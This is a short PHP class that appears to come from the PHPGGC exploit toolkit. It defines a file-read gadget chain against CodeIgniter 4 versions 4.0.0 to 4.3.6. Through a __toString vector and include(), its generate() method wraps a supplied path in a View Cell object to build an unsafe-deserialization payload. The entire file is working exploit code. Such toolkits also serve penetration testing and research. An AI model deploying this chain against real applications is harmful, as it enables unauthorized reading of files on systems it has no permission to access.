<?php

namespace GadgetChain\CodeIgniter4;

class FR1 extends \PHPGGC\GadgetChain\FileRead
{
    public static $version = '4.0.0 <= 4.3.6';
    public static $vector = '__toString';
    public static $author = 'byq';
    public static $information = 'include()';

    public function generate(array $parameters)
    {
        return new \CodeIgniter\View\Cells\Cell($parameters['remote_path']);
    }
}